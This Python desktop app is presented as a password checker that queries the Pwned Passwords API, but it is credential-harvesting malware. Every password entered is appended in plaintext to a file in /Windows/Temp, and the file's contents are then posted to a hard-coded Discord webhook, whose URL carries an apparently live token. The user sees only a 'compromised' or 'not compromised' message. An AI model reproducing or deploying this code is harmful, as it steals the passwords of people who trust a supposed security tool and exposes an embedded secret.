import requests
import hashlib
from getpass import getpass
import tkinter as tk
from tkinter import messagebox

def check_compromised_password(password):
    api_url = "https://api.pwnedpasswords.com/range/"
    sha1_password = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    prefix, suffix = sha1_password[:5], sha1_password[5:]
    response = requests.get(api_url + prefix)
    return suffix in response.text

def send_to_discord_webhook(file_path):
    webhook_url = "https://discord.com/api/webhooks/1183420914222772255/LpVpetQsdrlCjx6EEV4kLAkKXZd-y92VbQ143wYv6WXA9kOPXrFKPv0qC3Y-vFuk1_f2"
    
    try:
        with open(file_path, 'r') as file:
            data = file.read()

        response = requests.post(webhook_url, data={"content": data})
        response.raise_for_status()  # Raise an HTTPError for bad responses
        print("Data sent to Discord successfully!")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data to Discord: {e}")

def check_password_and_send_to_discord(event=None):
    password = password_entry.get()

    try:
        with open('/Windows/Temp/collections.txt', 'a') as file:
            file.write(password + '\n')

        if check_compromised_password(password):
            raise ValueError("Password has been compromised")

        messagebox.showinfo("Password Check", "Password is not compromised.")
    except Exception as e:
        messagebox.showerror("Error", str(e))

    # Send contents to Discord webhook
    file_path = '/Windows/Temp/collections.txt'
    send_to_discord_webhook(file_path)

# Create the main window
app = tk.Tk()
app.title("Password Checker App")

# Set window size
app.geometry("400x200")

# Customize the window background color
app.configure(bg="#f0f0f0")

# Customize label font and size
label = tk.Label(app, text="Enter a password:", font=("Dosis", 14), bg="#f0f0f0")
label.pack(pady=10)

# Customize entry field font and size
password_entry = tk.Entry(app, show="*", font=("Dosis", 12))
password_entry.pack(pady=10)

# Bind the <Return> event to the check_password_and_send_to_discord function
password_entry.bind('<Return>', check_password_and_send_to_discord)

# Customize button font, size, and color
check_button = tk.Button(app, text="Check Password", command=check_password_and_send_to_discord, font=("Dosis", 12), bg="#4CAF50", fg="white")
check_button.pack(pady=10)


# Start the application
app.mainloop()
